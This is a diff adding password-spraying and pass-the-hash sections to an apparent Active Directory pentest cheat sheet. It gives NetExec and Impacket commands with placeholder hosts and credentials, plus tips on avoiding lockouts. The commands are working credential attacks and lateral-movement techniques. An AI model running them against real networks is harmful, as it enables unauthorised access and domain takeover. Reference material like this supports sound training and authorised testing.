@@ -47,3 +47,25 @@ nxc smb {{RHOST}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -k --kdcHost {{DC0
 ```
 
 Check [DNS and time](active-directory/kerberos#kerberos-dns-or-clock-failure) first. [Source](https://www.netexec.wiki/getting-started/using-kerberos).
+
+## Password spraying
+
+Spray harvested lists against one service at a time. Check the [password policy](active-directory/ad-enumeration#password-policy) for a lockout threshold first. users.txt and passwords.txt hold one value per line on Kali.
+
+```bash
+nxc smb {{MS01}} {{MS02}} -u users.txt -p passwords.txt -d '{{DOMAIN}}' --continue-on-success
+nxc winrm {{MS01}} {{MS02}} -u users.txt -p passwords.txt -d '{{DOMAIN}}' --continue-on-success
+```
+
+`(Pwn3d!)` or `STATUS_SUCCESS` marks a working pair. Empty the cracked pair from the list before the next round to avoid lockouts. [NetExec SMB authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain).
+
+## Pass-the-Hash
+
+Replay an NT hash where a password would otherwise go. Set NTHASH to the hash after the colon in `aad3b435b51404eeaad3b435b51404ee:<NTHASH>`.
+
+```bash
+impacket-psexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{MS02}}
+impacket-wmiexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{MS02}}
+```
+
+Requires administrator on the target; a domain-admin hash reaches {{DC01}} the same way. Verify the resulting identity. [Impacket examples](https://github.com/fortra/impacket/tree/master/examples).
